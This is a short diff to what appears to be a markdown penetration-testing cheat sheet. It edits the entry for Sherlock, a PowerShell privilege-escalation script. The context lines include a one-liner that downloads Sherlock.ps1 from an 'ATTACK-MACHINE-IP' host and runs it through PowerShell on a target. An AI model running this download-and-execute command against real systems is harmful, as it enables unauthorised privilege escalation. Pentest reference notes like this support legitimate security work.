@@ -88,7 +88,7 @@
 
 #### PowerShell
 
-- [Sherlock](https://github.com/rasta-mouse/Sherlock) is a script that will give exploit related to the target.  
+- [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock) is a powershell script that will give exploit related to the target.  
   It can also be found here on kali if empire is installed `/usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1`
   - We can launch it with cmd like this (has to be served through an http server from the attacking machine)  
   `echo IEX(New-Object Net.WebClient).DownloadString('http://ATTACK-MACHINE-IP/Sherlock.ps1') | powershell -noprofile -`
